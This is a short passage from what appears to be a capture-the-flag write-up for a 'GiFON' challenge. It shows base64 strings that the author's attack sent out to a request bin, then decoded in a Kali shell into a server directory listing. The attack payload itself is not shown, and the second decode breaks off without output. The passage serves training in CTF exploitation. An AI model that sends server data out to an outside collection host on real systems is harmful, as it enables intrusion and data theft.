...
`{"success":true}` looks like a good sign, and indeed - our request bin receives a hit with `[AWS_SECRET_REMOVED]c2VjcmV0CnZlbmRvcgo=`:

```console
root@kali:/media/sf_CTFs/shabak/GiFON# echo [AWS_SECRET_REMOVED]c2VjcmV0CnZlbmRvcgo= | base64 -d
css
gulpfile.js
img
index.php
...
```console
root@kali:/media/sf_CTFs/shabak/GiFON# echo [AWS_SECRET_REMOVED]Ui1VLTI/fQ== | base64 -d
